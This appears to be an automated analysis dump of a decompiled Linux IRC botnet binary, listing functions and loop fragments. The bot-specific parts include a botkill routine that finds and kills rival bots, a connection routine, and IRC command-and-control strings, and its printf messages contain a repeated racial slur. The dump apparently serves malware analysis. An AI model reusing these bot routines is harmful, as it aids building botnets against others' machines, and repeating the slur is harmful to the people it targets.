+    int32_t v7 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&g27); // 0x80663c1
+        int32_t v15 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&g27); // 0x80663df
+        while (true) {
+            if (fgets(str, 128, g7) == 0) {
+                __GI_fclose((int16_t *)g3);
+        while (true) {
+            while (true) {
+            while (true) {
+                        while (true) {
+                            while (true) {
+                    while (true) {
+                        while (true) {
+                            free(*(int32_t *)(4 * v53 + 0x807f544));
+    while (true) {
+        if (fgets(str, 128, g7) != 0) {
+        __GI_fclose((int16_t *)g3);
+    while (true) {
+    while (true) {
+        if (fgets(str, 128, g7) != 0) {
+        __GI_fclose((int16_t *)g3);
+=================FUNCTION : _ppfs_parsespec ===================
+++++++++ FUNCTION START 8056
+++++++++ FUNCTION END 9241
+++++++++ FUNCTION LENGTH 1185
+        while (true) {
+                while (true) {
+                    while (true) {
+                            while (true) {
+                                            while (true) {
+                                                while (true) {
+                                                    while (true) {
+                                                                    while (true) {
+                                                                            while (true) {
+                                                                                        while (true) {
+                                                                                while (true) {
+                                                                while (true) {
+                                                                        while (true) {
+                                                                                    while (true) {
+                                                                                while (true) {
+                                                    while (true) {
+                                                            while (true) {
+                                                                        while (true) {
+                                                                    while (true) {
+    while (true) {
+=================FUNCTION : con ===================
+++++++++ FUNCTION START 870
+++++++++ FUNCTION END 986
+++++++++ FUNCTION LENGTH 116
+    while (true) {
+            int32_t v7 = random(); // 0x8055b8e
+        int32_t v9 = socket(2, 1, 6); // 0x8055bd2
+            v9 = socket(2, 1, 6);
+        if (inet_addr(g103) != 0) {
+            if (inet_addr(g103) != -1) {
+                v4 = inet_addr(g103);
+                    while (true) {
+                        if (connect(g101, v3, 16) == 0 || *(int32_t *)__errno_location(v11) == 106) {
+                            __GI_setsockopt(g101, 1, 13, 0, 0);
+                            __GI_setsockopt(g101, 1, 2, 0, 0);
+                            return __GI_setsockopt(g101, 1, 9, 0, 0);
+                            close(g101);
+                        close(fd);
+                    close(g101);
+                close(g101);
+        int32_t v12 = __GI_gethostbyname(g103); // 0x8055c10
+            close(g101);
+=================FUNCTION : __GI_clntudp_bufcreate ===================
+++++++++ FUNCTION START 17866
+++++++++ FUNCTION END 18123
+++++++++ FUNCTION LENGTH 257
+                    v19 = socket(2, 2, 17);
+                        __GI_setsockopt(*a5, 0, 11, v17, 4);
+                            free(mem);
+                            free(v7);
+                uint32_t v20 = pmap_getport(a1, a2, a3, 17); // 0x80635c7
+                        v19 = socket(2, 2, 17);
+                            __GI_setsockopt(*a5, 0, 11, v17, 4);
+                                free(mem);
+                                free(v7);
+                free(mem);
+                free(v7);
+    __GI_fputs((int32_t)"clntudp_create: out of memory\n", *(int32_t *)&g44);
+        free(mem);
+        free(v7);
+=================FUNCTION : _stdio_fopen ===================
+++++++++ FUNCTION START 5151
+++++++++ FUNCTION END 6623
+++++++++ FUNCTION LENGTH 1472
+                        free(v11);
+                v39 = __libc_open(v17, (char)v38, 438);
+                        free(v11);
+                            free(v11);
+                    free(v11);
+            v39 = __libc_open(v17, (char)v38, 438);
+                    free(v11);
+                            free(v11);
+                free(v11);
+        v39 = __libc_open(v17, (char)v38, 438);
+                free(v11);
+                            free(v11);
+                free(v11);
+=================FUNCTION : botkill ===================
+++++++++ FUNCTION START 801
+++++++++ FUNCTION END 867
+++++++++ FUNCTION LENGTH 66
+    while (true) {
+        printf("Scanning for bot %s.\n", (char *)*v2);
+        int32_t pid = proc_find(*v2); // 0x8052cb0
+            printf("Killing bot %s PID %d.\n", (char *)*v2, pid);
+            int32_t file_path = getexename(pid); // 0x8052ce9
+            if (kill(pid, SIGKILL) == 0) {
+                printf("Bot %s was not found on the system. It must have been running in memory.", (char *)v4);
+                printf("Bot %s found at %s Deleting...\n", (char *)v4, v5);
+                    printf("Unable to nigger bot %s.\n", v5);
+                    printf("Bot %s niggered successfully.\n", v5);
+    return printf("Botkill finished. %d bots killed and %d bots niggered.\n", (int32_t)g56, (int32_t)g57);
+=================FUNCTION : proc_find ===================
+++++++++ FUNCTION START 698
+++++++++ FUNCTION END 765
+++++++++ FUNCTION LENGTH 67
+    int32_t v2 = __GI_opendir((int32_t)"/proc"); // 0x8052a66
+            while (true) {
+                    __GI_snprintf(str, 512, (int32_t)"/proc/%ld/cmdline");
+                    int32_t stream = __GI_fopen(str, (int32_t)&g11); // 0x8052af7
+                        if (fgets(str, 512, stream) != 0) {
+                                __GI_fclose((int16_t *)stream);
+                                __GI_closedir(v3);
+                        __GI_fclose((int16_t *)stream);
+            __GI_closedir(v3);
+        __GI_closedir(v3);
+        perror("can't open /proc");
+=================FUNCTION : __get_myaddress ===================
+++++++++ FUNCTION START 22053
+++++++++ FUNCTION END 22215
+++++++++ FUNCTION LENGTH 162
+    int32_t v6 = socket(2, 2, 0); // 0x806760c
+            str = "__get_myaddress: ioctl (get interface configuration)";
+        while (true) {
+                while (true) {
+                                __libc_close(g3);
+                        str = "__get_myaddress: ioctl";
+                __libc_close(g3);
+        __libc_close(g3);
+    str = "__get_myaddress: socket";
+=================FUNCTION : __rpc_thread_destroy ===================
+++++++++ FUNCTION START 12149
+++++++++ FUNCTION END 12175
+++++++++ FUNCTION LENGTH 26
+    int32_t v1 = __pthread_internal_tsd_get(2); // 0x8061e5c
+        free(*(int32_t *)(g4 + 152));
+        free(*(int32_t *)(g4 + 156));
+        free(*(int32_t *)(g4 + 160));
+        free(*(int32_t *)(g4 + 188));
+        free(*(int32_t *)(g4 + 172));
+        free(*(int32_t *)(g4 + 176));
+        free(g4);
+=================FUNCTION : memrchr ===================
+++++++++ FUNCTION START 17584
+++++++++ FUNCTION END 17759
+++++++++ FUNCTION LENGTH 175
+        while (true) {
+            while (true) {
+            while (true) {
+        while (true) {
+        while (true) {
+    while (true) {
+=================FUNCTION : __pthread_alt_unlock ===================
+++++++++ FUNCTION START 2098
+++++++++ FUNCTION END 2227
+++++++++ FUNCTION LENGTH 129
+    while (true) {
+            while (true) {
+                while (true) {
+                        wait_node_dequeue();
+                        wait_node_free();
+                    wait_node_dequeue();
+=================FUNCTION : __GI_opendir ===================
+++++++++ FUNCTION START 4848
+++++++++ FUNCTION END 4950
+++++++++ FUNCTION LENGTH 102
+    int32_t v5 = __libc_open(a1, 0, v4); // 0x805b3e5
+                __libc_close(v10);
+                free(g4);
+                __libc_close(v10);
+    __libc_close(g6);
+=================FUNCTION : randstring ===================
+++++++++ FUNCTION START 640
+++++++++ FUNCTION END 684
+++++++++ FUNCTION LENGTH 44
+    srand(__GI_time(NULL));
+            int32_t v6 = random(); // 0x8048591
+            char v7 = *(char *)((int32_t)((int64_t)v6 % 62) + (int32_t)"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"); // 0x80485af
+                v6 = random();
+                v7 = *(char *)((int32_t)((int64_t)v6 % 62) + (int32_t)"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
+=================FUNCTION : inet_pton ===================
+++++++++ FUNCTION START 9962
+++++++++ FUNCTION END 10402
+++++++++ FUNCTION LENGTH 440
+            while (true) {
+                while (true) {
+                    while (true) {
+                                    if (inet_pton4(v17, (int32_t)v19, v9) >= 1) {
+    inet_pton4(v4, v3, v2);
+=================FUNCTION : __pthread_destroy_specifics ===================
+++++++++ FUNCTION START 1849
+++++++++ FUNCTION END 1987
+++++++++ FUNCTION LENGTH 138
+        while (true) {
+                while (true) {
+                while (true) {
+                        free(v11);
+    while (true) {
+=================FUNCTION : __GI_bindresvport ===================
+++++++++ FUNCTION START 21937
+++++++++ FUNCTION END 22050
+++++++++ FUNCTION LENGTH 113
+            v5 = __libc_getpid(v3);
+        while (true) {
+        v5 = __libc_getpid(v3);
+    while (true) {
+=================FUNCTION : __pthread_reset_main_thread ===================
+++++++++ FUNCTION START 2719
+++++++++ FUNCTION END 2747
+++++++++ FUNCTION LENGTH 28
+        free(g67);
+        __libc_close(g40);
+        __libc_close(v2);
+    int32_t result = __libc_getpid(v2); // 0x8058f62
+=================FUNCTION : _stdlib_strto_l ===================
+++++++++ FUNCTION START 11614
+++++++++ FUNCTION END 12016
+++++++++ FUNCTION LENGTH 402
+        while (true) {
+            while (true) {
+            while (true) {
+        while (true) {
+=================FUNCTION : xdr_bytes ===================
+++++++++ FUNCTION START 18516
+++++++++ FUNCTION END 18681
+++++++++ FUNCTION LENGTH 165
+                free(v8);
+            free(v8);
+                free(v8);
+            free(v8);
+=================FUNCTION : __rpc_thread_variables ===================
+++++++++ FUNCTION START 12095
+++++++++ FUNCTION END 12128
+++++++++ FUNCTION LENGTH 33
+    int32_t result = __pthread_internal_tsd_get(2); // 0x8061cff
+    int32_t result2 = __pthread_internal_tsd_get(2); // 0x8061d5d
+        result3 = __pthread_internal_tsd_get(2);
+=================FUNCTION : __pthread_lock ===================
+++++++++ FUNCTION START 2321
+++++++++ FUNCTION END 2447
+++++++++ FUNCTION LENGTH 126
+    while (true) {
+    while (true) {
+    while (true) {
+=================FUNCTION : __GI_closedir ===================
+++++++++ FUNCTION START 4811
+++++++++ FUNCTION END 4845
+++++++++ FUNCTION LENGTH 34
+        free(*(int32_t *)(g6 + 12));
+        free(g6);
+        result = __libc_close(g4);
+=================FUNCTION : __GI_pthread_cond_wait ===================
+++++++++ FUNCTION START 3147
+++++++++ FUNCTION END 3568
+++++++++ FUNCTION LENGTH 421
+                while (true) {
+                while (true) {
+            while (true) {
+=================FUNCTION : __GI_fclose ===================
+++++++++ FUNCTION START 5034
+++++++++ FUNCTION END 5101
+++++++++ FUNCTION LENGTH 67
+    int32_t v10 = __libc_close(*(int32_t *)(v9 + 4)); // 0x805b598
+        free(*(int32_t *)(v13 + 8));
+    _stdio_openlist_dec_use();
+=================FUNCTION : _create_xid ===================
+++++++++ FUNCTION START 18126
+++++++++ FUNCTION END 18147
+++++++++ FUNCTION LENGTH 21
+        gettimeofday((int32_t)&v4, 0, v3, v3);
+        __GI_srand48_r((int16_t)(v4 ^ v5), (int32_t)&g87);
+    lrand48_r((int32_t)&g87, (int32_t)&result, v6, v6);
+=================FUNCTION : realrand ===================
+++++++++ FUNCTION START 687
+++++++++ FUNCTION END 695
+++++++++ FUNCTION LENGTH 8
+    int32_t v2 = __libc_getpid(0); // 0x8049040
+    srand(g4 + v2);
+    int32_t v3 = random(); // 0x8049050
+=================FUNCTION : rawmemchr ===================
+++++++++ FUNCTION START 21716
+++++++++ FUNCTION END 21815
+++++++++ FUNCTION LENGTH 99
+        while (true) {
+    while (true) {
+=================FUNCTION : __GI_sigprocmask ===================
+++++++++ FUNCTION START 4662
+++++++++ FUNCTION END 4714
+++++++++ FUNCTION LENGTH 52
+        v4 = sigprocmask(how, set, oset);
+    v4 = sigprocmask(how, set, oset);
+=================FUNCTION : __GI_fgets_unlocked ===================
+++++++++ FUNCTION START 9316
+++++++++ FUNCTION END 9426
+++++++++ FUNCTION LENGTH 110
+            while (true) {
+                int32_t v8 = getc_unlocked(); // 0x805d15d
+=================FUNCTION : __getdents64 ===================
+++++++++ FUNCTION START 12300
+++++++++ FUNCTION END 12400
+++++++++ FUNCTION LENGTH 100
+    int32_t v6 = getdents64(a1, (struct linux_dirent64 *)v5, a3); // 0x806210e
+    while (true) {
+=================FUNCTION : __stdio_WRITE ===================
+++++++++ FUNCTION START 12729
+++++++++ FUNCTION END 12850
+++++++++ FUNCTION LENGTH 121
+    while (true) {
+            while (true) {
+=================FUNCTION : __GI_readdir ===================
+++++++++ FUNCTION START 4953
+++++++++ FUNCTION END 5031
+++++++++ FUNCTION LENGTH 78
+    while (true) {
+            int32_t v14 = __getdents(*(int32_t *)v6, v13, v12, g7); // 0x805b500
+=================FUNCTION : __malloc_consolidate ===================
+++++++++ FUNCTION START 11360
+++++++++ FUNCTION END 11572
+++++++++ FUNCTION LENGTH 212
+        while (true) {
+                while (true) {
+=================FUNCTION : __GI_strspn ===================
+++++++++ FUNCTION START 21818
+++++++++ FUNCTION END 21879
+++++++++ FUNCTION LENGTH 61
+    while (true) {
+        while (true) {
+=================FUNCTION : __GI_wcsnrtombs ===================
+++++++++ FUNCTION START 12549
+++++++++ FUNCTION END 12693
+++++++++ FUNCTION LENGTH 144
+            while (true) {
+        while (true) {
+=================FUNCTION : __open_etc_hosts ===================
+++++++++ FUNCTION START 22440
+++++++++ FUNCTION END 22453
+++++++++ FUNCTION LENGTH 13
+    int32_t v1 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&g27); // 0x8067cfd
+        result = __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&g27);
+=================FUNCTION : pthread_once ===================
+++++++++ FUNCTION START 4123
+++++++++ FUNCTION END 4216
+++++++++ FUNCTION LENGTH 93
+    __GI_pthread_cond_wait((int32_t)&g70, (int32_t)&g69, v10, v10);
+        __GI_pthread_cond_wait((int32_t)&g70, (int32_t)&g69, v10, v10);
+=================FUNCTION : _stdio_openlist_dec_use ===================
+++++++++ FUNCTION START 9244
+++++++++ FUNCTION END 9313
+++++++++ FUNCTION LENGTH 69
+    while (true) {
+                free(v7);
+=================FUNCTION : __GI_pmap_unset ===================
+++++++++ FUNCTION START 22218
+++++++++ FUNCTION END 22248
+++++++++ FUNCTION LENGTH 30
+    if (__get_myaddress(-1, v1) == 0) {
+    int32_t v5 = __GI_clntudp_bufcreate(v3, 0x186a0, 2, 5, NULL, (int32_t)&v4, 400, 400); // 0x8067778
+=================FUNCTION : inet_aton ===================
+++++++++ FUNCTION START 10405
+++++++++ FUNCTION END 10515
+++++++++ FUNCTION LENGTH 110
+        while (true) {
+            while (true) {
+=================FUNCTION : _stdio_term ===================
+++++++++ FUNCTION START 6632
+++++++++ FUNCTION END 6702
+++++++++ FUNCTION LENGTH 70
+        while (true) {
+    while (true) {
+=================FUNCTION : __decode_dotted ===================
+++++++++ FUNCTION START 18696
+++++++++ FUNCTION END 18813
+++++++++ FUNCTION LENGTH 117
+        while (true) {
+            while (true) {
+=================FUNCTION : _vfprintf_internal ===================
+++++++++ FUNCTION START 6847
+++++++++ FUNCTION END 7734
+++++++++ FUNCTION LENGTH 887
+    while (true) {
+                                                                                while (true) {
+=================FUNCTION : _uintmaxtostr ===================
+++++++++ FUNCTION START 13449
+++++++++ FUNCTION END 13569
+++++++++ FUNCTION LENGTH 120
+        while (true) {
+    while (true) {
+=================FUNCTION : __GI_strpbrk ===================
+++++++++ FUNCTION START 17762
+++++++++ FUNCTION END 17835
+++++++++ FUNCTION LENGTH 73
+        while (true) {
+                while (true) {
+=================FUNCTION : __GI_vfprintf ===================
+++++++++ FUNCTION START 6729
+++++++++ FUNCTION END 6790
+++++++++ FUNCTION LENGTH 61
+        g4 = _vfprintf_internal(v6, (char *)a2, a3);
+        g4 = _vfprintf_internal(g8, (char *)a2, a3);
+=================FUNCTION : __pthread_unlock ===================
+++++++++ FUNCTION START 2450
+++++++++ FUNCTION END 2557
+++++++++ FUNCTION LENGTH 107
+    while (true) {
+                while (true) {
+=================FUNCTION : __pthread_do_exit ===================
+++++++++ FUNCTION START 1476
+++++++++ FUNCTION END 1602
+++++++++ FUNCTION LENGTH 126
+        while (true) {
+    while (true) {
+=================FUNCTION : filter ===================
+++++++++ FUNCTION START 617
+++++++++ FUNCTION END 637
+++++++++ FUNCTION LENGTH 20
+    while (true) {
+=================FUNCTION : __GI_fopen ===================
+++++++++ FUNCTION START 5104
+++++++++ FUNCTION END 5107
+++++++++ FUNCTION LENGTH 3
+    return _stdio_fopen(a1, (char *)a2, 0, -1);
+=================FUNCTION : __pthread_acquire ===================
+++++++++ FUNCTION START 2031
+++++++++ FUNCTION END 2076
+++++++++ FUNCTION LENGTH 45
+    while (true) {
+=================FUNCTION : pthread_kill ===================
+++++++++ FUNCTION START 1748
+++++++++ FUNCTION END 1783
+++++++++ FUNCTION LENGTH 35
+            if (kill(g4, sig_num) == -1) {
+=================FUNCTION : __GI_raise ===================
+++++++++ FUNCTION START 1786
+++++++++ FUNCTION END 1803
+++++++++ FUNCTION LENGTH 17
+    int32_t v4 = pthread_kill(v2, a1, v3, v3); // 0x8057e00
+=================FUNCTION : socket ===================
+++++++++ FUNCTION START 11256
+++++++++ FUNCTION END 11258
+++++++++ FUNCTION LENGTH 2
+    return __socketcall(1, (int32_t)&a1);
+=================FUNCTION : __GI_strchr ===================
+++++++++ FUNCTION START 9528
+++++++++ FUNCTION END 9554
+++++++++ FUNCTION LENGTH 26
+    while (true) {
+=================FUNCTION : open ===================
+++++++++ FUNCTION START 2598
+++++++++ FUNCTION END 2608
+++++++++ FUNCTION LENGTH 10
+    int32_t v3 = __libc_open(a1, (char)a2, v2); // 0x8058a5c
+=================FUNCTION : __libc_waitpid ===================
+++++++++ FUNCTION START 4778
+++++++++ FUNCTION END 4781
+++++++++ FUNCTION LENGTH 3
+    return wait4(a1, a2, a3, 0);
+=================FUNCTION : __libc_close ===================
+++++++++ FUNCTION START 4354
+++++++++ FUNCTION END 4373
+++++++++ FUNCTION LENGTH 19
+    int32_t v2 = close(fd); // 0x805a920
+=================FUNCTION : __pthread_wait_for_restart_signal ===================
+++++++++ FUNCTION START 2629
+++++++++ FUNCTION END 2652
+++++++++ FUNCTION LENGTH 23
+    __GI_sigprocmask(2, NULL, v4);
+=================FUNCTION : __GI_vsnprintf ===================
+++++++++ FUNCTION START 5117
+++++++++ FUNCTION END 5148
+++++++++ FUNCTION LENGTH 31
+    int32_t result = _vfprintf_internal(v7, (char *)a3, a4); // 0x805b912
+=================FUNCTION : _ppfs_init ===================
+++++++++ FUNCTION START 7737
+++++++++ FUNCTION END 7821
+++++++++ FUNCTION LENGTH 84
+        while (true) {
+=================FUNCTION : recv ===================
+++++++++ FUNCTION START 2560
+++++++++ FUNCTION END 2569
+++++++++ FUNCTION LENGTH 9
+    g4 = __libc_recv(a1, a2, a3, a4);
+=================FUNCTION : Send ===================
+++++++++ FUNCTION START 605
+++++++++ FUNCTION END 614
+++++++++ FUNCTION LENGTH 9
+    vsprintf((int32_t)&g61, format, (int32_t)&v1);
+=================FUNCTION : __GI_gethostbyname ===================
+++++++++ FUNCTION START 10534
+++++++++ FUNCTION END 10539
+++++++++ FUNCTION LENGTH 5
+    gethostbyname_r(a1, &g78, (int32_t)&g77, 460, (int32_t)&result, v1, g7);
+=================FUNCTION : __libc_send ===================
+++++++++ FUNCTION START 11246
+++++++++ FUNCTION END 11248
+++++++++ FUNCTION LENGTH 2
+    return __socketcall(9, (int32_t)&a1);
+=================FUNCTION : __rpc_thread_clnt_cleanup ===================
+++++++++ FUNCTION START 17838
+++++++++ FUNCTION END 17863
+++++++++ FUNCTION LENGTH 25
+    free(v2);
+=================FUNCTION : __libc_connect ===================
+++++++++ FUNCTION START 11236
+++++++++ FUNCTION END 11238
+++++++++ FUNCTION LENGTH 2
+    return __socketcall(3, (int32_t)&a1);
+=================FUNCTION : suspend3 ===================
+++++++++ FUNCTION START 3141
+++++++++ FUNCTION END 3144
+++++++++ FUNCTION LENGTH 3
+    return __pthread_wait_for_restart_signal(g2);
+=================FUNCTION : wait4 ===================
+++++++++ FUNCTION START 4753
+++++++++ FUNCTION END 4775
+++++++++ FUNCTION LENGTH 22
+    int32_t v5 = wait4(v3, v2, v1, v4); // 0x805b2d1
+=================FUNCTION : __pthread_trylock ===================
+++++++++ FUNCTION START 3601
+++++++++ FUNCTION END 3638
+++++++++ FUNCTION LENGTH 37
+    while (true) {
+=================FUNCTION : __libc_fork ===================
+++++++++ FUNCTION START 4376
+++++++++ FUNCTION END 4391
+++++++++ FUNCTION LENGTH 15
+    int32_t v2 = fork(g4); // 0x805a949
+=================FUNCTION : __libc_open ===================
+++++++++ FUNCTION START 4551
+++++++++ FUNCTION END 4577
+++++++++ FUNCTION LENGTH 26
+    int32_t v4 = open(v2, v3); // 0x805acef
+=================FUNCTION : __getdents ===================
+++++++++ FUNCTION START 12243
+++++++++ FUNCTION END 12297
+++++++++ FUNCTION LENGTH 54
+    int32_t result = __getdents64(a1, (int32_t *)a2, a3, g7, v3, v2, v1); // 0x8062081
+=================FUNCTION : inet_addr ===================
+++++++++ FUNCTION START 10518
+++++++++ FUNCTION END 10531
+++++++++ FUNCTION LENGTH 13
+    int32_t v1 = inet_aton((char *)a1, (int32_t)&result); // 0x805ebdc
+=================FUNCTION : __GI_clock_getres ===================
+++++++++ FUNCTION START 12197
+++++++++ FUNCTION END 12210
+++++++++ FUNCTION LENGTH 13
+    int32_t v1 = clock_getres(clk_id, res); // 0x8061f9b
+=================FUNCTION : __pthread_alt_trylock ===================
+++++++++ FUNCTION START 3641
+++++++++ FUNCTION END 3675
+++++++++ FUNCTION LENGTH 34
+    while (true) {
+=================FUNCTION : __libc_recv ===================
+++++++++ FUNCTION START 11241
+++++++++ FUNCTION END 11243
+++++++++ FUNCTION LENGTH 2
+    return __socketcall(10, (int32_t)&a1);
+=================FUNCTION : svc_unregister ===================
+++++++++ FUNCTION START 18278
+++++++++ FUNCTION END 18320
+++++++++ FUNCTION LENGTH 42
+        free(g4);
+=================FUNCTION : __length_dotted ===================
+++++++++ FUNCTION START 23227
+++++++++ FUNCTION END 23274
+++++++++ FUNCTION LENGTH 47
+    while (true) {
+=================FUNCTION : svc_find ===================
+++++++++ FUNCTION START 18232
+++++++++ FUNCTION END 18275
+++++++++ FUNCTION LENGTH 43
+        while (true) {
+=================FUNCTION : __GI_strncat ===================
+++++++++ FUNCTION START 21668
+++++++++ FUNCTION END 21713
+++++++++ FUNCTION LENGTH 45
+        while (true) {
+=================FUNCTION : connect ===================
+++++++++ FUNCTION START 2572
+++++++++ FUNCTION END 2581
+++++++++ FUNCTION LENGTH 9
+    g4 = __libc_connect(a1, a2, a3);
+=================FUNCTION : __pthread_restart_new ===================
+++++++++ FUNCTION START 2623
+++++++++ FUNCTION END 2626
+++++++++ FUNCTION LENGTH 3
+    return kill(*(int32_t *)(a1 + 20), g41);
+=================FUNCTION : __get_hosts_byname_r ===================
+++++++++ FUNCTION START 21150
+++++++++ FUNCTION END 21153
+++++++++ FUNCTION LENGTH 3
+    return __read_etc_hosts_r(0, a1, a2, 0, (int32_t *)a3, a4, a5, a6, a7);
+=================FUNCTION : __GI_strcoll ===================
+++++++++ FUNCTION START 9557
+++++++++ FUNCTION END 9582
+++++++++ FUNCTION LENGTH 25
+    while (true) {
+=================FUNCTION : __GI_snprintf ===================
+++++++++ FUNCTION START 5110
+++++++++ FUNCTION END 5114
+++++++++ FUNCTION LENGTH 4
+    return __GI_vsnprintf((char *)a1, a2, a3, (int32_t)&v1);
+=================FUNCTION : __encode_dotted ===================
+++++++++ FUNCTION START 23126
+++++++++ FUNCTION END 23224
+++++++++ FUNCTION LENGTH 98
+    while (true) {
+=================FUNCTION : suspend ===================
+++++++++ FUNCTION START 1470
+++++++++ FUNCTION END 1473
+++++++++ FUNCTION LENGTH 3
+    return __pthread_wait_for_restart_signal(g2);
+=================FUNCTION : __pthread_alt_lock ===================
+++++++++ FUNCTION START 2264
+++++++++ FUNCTION END 2318
+++++++++ FUNCTION LENGTH 54
+    while (true) {
+=================FUNCTION : __pthread_perform_cleanup ===================
+++++++++ FUNCTION START 2782
+++++++++ FUNCTION END 2852
+++++++++ FUNCTION LENGTH 70
+            while (true) {
+=================FUNCTION : waitpid ===================
+++++++++ FUNCTION START 2584
+++++++++ FUNCTION END 2595
+++++++++ FUNCTION LENGTH 11
+    int32_t v3 = __libc_waitpid(a1, a2, a3); // 0x8058825
+=================FUNCTION : _charpad ===================
+++++++++ FUNCTION START 6793
+++++++++ FUNCTION END 6844
+++++++++ FUNCTION LENGTH 51
+    while (true) {
+=================FUNCTION : inet_pton4 ===================
+++++++++ FUNCTION START 9866
+++++++++ FUNCTION END 9959
+++++++++ FUNCTION LENGTH 93
+        while (true) {
+=================FUNCTION : __GI_setsockopt ===================
+++++++++ FUNCTION START 11251
+++++++++ FUNCTION END 11253
+++++++++ FUNCTION LENGTH 2
+    return __socketcall(14, (int32_t)&a1);
+=================FUNCTION : pmap_getport ===================
+++++++++ FUNCTION START 18150
+++++++++ FUNCTION END 18173
+++++++++ FUNCTION LENGTH 23
+    int32_t v4 = __GI_clntudp_bufcreate(g6, 0x186a0, 2, 5, NULL, (int32_t)&v3, 400, 400); // 0x8063e12
+=================FUNCTION : __libc_getpid ===================
+++++++++ FUNCTION START 4400
+++++++++ FUNCTION END 4415
+++++++++ FUNCTION LENGTH 15
+    int32_t pid = getpid(g4); // 0x805aa05
+=================FUNCTION : gettimeofday ===================
+++++++++ FUNCTION START 4434
+++++++++ FUNCTION END 4451
+++++++++ FUNCTION LENGTH 17
+    int32_t v3 = gettimeofday(v1, v2, a1, a2); // 0x805aa93
+=================FUNCTION : __pthread_find_self ===================
+++++++++ FUNCTION START 2655
+++++++++ FUNCTION END 2681
+++++++++ FUNCTION LENGTH 26
+    while (true) {
+=================FUNCTION : _ppfs_setargs ===================
+++++++++ FUNCTION START 7845
+++++++++ FUNCTION END 8035
+++++++++ FUNCTION LENGTH 190
+        while (true) {
+=================FUNCTION : getexename ===================
+++++++++ FUNCTION START 768
+++++++++ FUNCTION END 798
+++++++++ FUNCTION LENGTH 30
+    if (__GI_snprintf(path, 64, (int32_t)"/proc/%i/exe") >= 0) {
+=================FUNCTION : suspend2 ===================
+++++++++ FUNCTION START 2258
+++++++++ FUNCTION END 2261
+++++++++ FUNCTION LENGTH 3
+    return __pthread_wait_for_restart_signal(g2);
+=================FUNCTION : bind ===================
+++++++++ FUNCTION START 11231
+++++++++ FUNCTION END 11233
+++++++++ FUNCTION LENGTH 2
+    return __socketcall(2, (int32_t)&a1);
+=================FUNCTION : __GI_strcasecmp ===================
+++++++++ FUNCTION START 9763
+++++++++ FUNCTION END 9799
+++++++++ FUNCTION LENGTH 36
+    while (true) {
+================================================================================
+========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
+================================================================================
+=============================WHILE LOOPS ID : 2 @ proc_find ====================================
+++++++++ WHILE START : 708 
+++++++++ WHILE FUNCTION : proc_find 
+++++++++ WHILE END : 746 
+++++++++ INTRESTING INSTRUCTIONS :  
+		__GI_snprintf(str, 512, (int32_t)"/proc/%ld/cmdline");
+		int32_t stream = __GI_fopen(str, (int32_t)&g11); // 0x8052af7
+		if (fgets(str, 512, stream) != 0) {
+		__GI_fclose((int16_t *)stream);
+		__GI_closedir(v3);
+		__GI_fclose((int16_t *)stream);
+=============================WHILE LOOPS ID : 3 @ botkill ====================================
+++++++++ WHILE START : 804 
+++++++++ WHILE FUNCTION : botkill 
+++++++++ WHILE END : 864 
+++++++++ INTRESTING INSTRUCTIONS :  
+		printf("Scanning for bot %s.\n", (char *)*v2);
+		int32_t pid = proc_find(*v2); // 0x8052cb0
+		printf("Killing bot %s PID %d.\n", (char *)*v2, pid);
+		int32_t file_path = getexename(pid); // 0x8052ce9
+		if (kill(pid, SIGKILL) == 0) {
+		printf("Bot %s was not found on the system. It must have been running in memory.", (char *)v4);
+		printf("Bot %s found at %s Deleting...\n", (char *)v4, v5);
+		printf("Unable to nigger bot %s.\n", v5);
+		printf("Bot %s niggered successfully.\n", v5);
+=============================WHILE LOOPS ID : 4 @ con ====================================
+++++++++ WHILE START : 880 
+++++++++ WHILE FUNCTION : con 
+++++++++ WHILE END : 985 
+++++++++ INTRESTING INSTRUCTIONS :  
+		int32_t v7 = random(); // 0x8055b8e
+		int32_t v9 = socket(2, 1, 6); // 0x8055bd2
+		v9 = socket(2, 1, 6);
+		if (inet_addr(g103) != 0) {
+		if (inet_addr(g103) != -1) {
+		v4 = inet_addr(g103);
+		while (true) {
+		if (connect(g101, v3, 16) == 0 || *(int32_t *)__errno_location(v11) == 106) {
+		__GI_setsockopt(g101, 1, 13, 0, 0);
+		__GI_setsockopt(g101, 1, 2, 0, 0);
+		return __GI_setsockopt(g101, 1, 9, 0, 0);
+		close(g101);
+		close(fd);
+		close(g101);
+		close(g101);
+		int32_t v12 = __GI_gethostbyname(g103); // 0x8055c10
+		close(g101);
+=============================WHILE LOOPS ID : 5 @ main ====================================
+++++++++ WHILE START : 1070 
+++++++++ WHILE FUNCTION : main 
+++++++++ WHILE END : 1210 
+++++++++ INTRESTING INSTRUCTIONS :  
+		getBuild();
+		Send(g101, (int32_t)"NICK [%s|%s]%s\nUSER %s localhost localhost :%s\n");
+		while (true) {
+		while (true) {
+		if (waitpid(*(int32_t *)(g106 + 4 * v24), 0, 1) >= 1) {
+		while (true) {
+		free(g106);
+		int32_t v35 = recv(v20, v8, 0x1000, 0); // 0x80561e9
+=============================WHILE LOOPS ID : 6 @ main ====================================
+++++++++ WHILE START : 1212 
+++++++++ WHILE FUNCTION : main 
+++++++++ WHILE END : 1367 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		__GI_strcasecmp((char *)*(int32_t *)&g33, v9);
+		__GI_strcasecmp((char *)*v52, v9);
+		v49 = __GI_strcasecmp((char *)&str4, (int32_t)"ERROR");
+		while (true) {
+		getBuild();
+		Send(g101, (int32_t)"NICK [%s|%s]%s\nUSER %s localhost localhost :%s\n");
+		if (kill(pid, SIGKILL) == 0) {
+		v49 = __GI_strcasecmp((char *)&str4, (int32_t)"ERROR");
+=============================WHILE LOOPS ID : 7 @ main ====================================
+++++++++ WHILE START : 1390 
+++++++++ WHILE FUNCTION : main 
+++++++++ WHILE END : 1400 
+++++++++ INTRESTING INSTRUCTIONS :  
+		getBuild();
+		Send(g101, (int32_t)"NICK [%s|%s]%s\nUSER %s localhost localhost :%s\n");
+=============================WHILE LOOPS ID : 10 @ __pthread_destroy_specifics ====================================
+++++++++ WHILE START : 1868 
+++++++++ WHILE FUNCTION : __pthread_destroy_specifics 
+++++++++ WHILE END : 1960 
